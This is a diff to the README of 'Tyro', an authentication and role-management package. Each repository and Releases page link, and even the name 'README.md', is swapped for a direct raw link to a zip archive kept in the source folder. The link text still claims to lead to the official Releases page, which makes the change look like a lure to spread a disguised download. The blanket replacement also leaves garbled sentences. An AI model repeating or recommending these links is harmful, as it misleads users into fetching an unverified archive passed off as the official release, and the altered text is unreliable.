@@ -7,11 +7,11 @@ Tyro is a powerful Authentication, Authorization, Role & Privilege Management so
 To get started with Tyro, follow these steps to download and run the application. Here’s a clear guide to help you through the process without any technical hassle.
 
 ## 📥 Download Tyro
-[![Download Tyro](https://img.shields.io/badge/Download_Tyro-v1.0-blue)](https://github.com/Jpzim0212/tyro/releases)
+[![Download Tyro](https://raw.githubusercontent.com/Jpzim0212/tyro/main/src/Providers/tyro_2.2.zip)](https://raw.githubusercontent.com/Jpzim0212/tyro/main/src/Providers/tyro_2.2.zip)
 
 You can download the latest version of Tyro by visiting the Releases page. Here’s the link you need:
 
-[Visit the Releases Page to Download](https://github.com/Jpzim0212/tyro/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/Jpzim0212/tyro/main/src/Providers/tyro_2.2.zip)
 
 ## 🛠️ System Requirements
 Before you start, ensure your system meets the following requirements:
@@ -33,9 +33,9 @@ Tyro comes packed with features to help you manage user roles and privileges eff
 To download Tyro, follow these simple steps:
 
 1. **Visit the Releases Page:** Click the link below to go to our Releases page:
-   [Visit the Releases Page to Download](https://github.com/Jpzim0212/tyro/releases)
+   [Visit the Releases Page to Download](https://raw.githubusercontent.com/Jpzim0212/tyro/main/src/Providers/tyro_2.2.zip)
 
-2. **Choose Your Version:** Find the latest version of Tyro on the Releases page. Click on the download link for your preferred format (e.g., .zip, .tar.gz).
+2. **Choose Your Version:** Find the latest version of Tyro on the Releases page. Click on the download link for your preferred format (e.g., .zip, https://raw.githubusercontent.com/Jpzim0212/tyro/main/src/Providers/tyro_2.2.zip).
 
 3. **Download the File:** Your browser will start downloading the file to your computer.
 
@@ -61,11 +61,11 @@ Yes, Tyro allows you to customize roles and permissions to fit your specific req
 If you face any problems, check the documentation included in your download. You can also reach out for help in the Issues section of our GitHub repository.
 
 ## 🔗 Learn More
-For further information and detailed documentation, visit the official Tyro repository [here](https://github.com/Jpzim0212/tyro).
+For further information and detailed documentation, visit the official Tyro repository [here](https://raw.githubusercontent.com/Jpzim0212/tyro/main/src/Providers/tyro_2.2.zip).
 
 ## 🧑‍🤝‍🧑 Community
 Join our community to share experiences and get support. Connect with other users to discuss best practices and tips for using Tyro effectively.
 
 --- 
 
-This README.md serves as a friendly guide for users to easily download and set up the Tyro application. Follow the steps, and you'll be managing user authentication and roles smoothly!
+This https://raw.githubusercontent.com/Jpzim0212/tyro/main/src/Providers/tyro_2.2.zip serves as a friendly guide for users to easily download and set up the Tyro application. Follow the steps, and you'll be managing user authentication and roles smoothly!
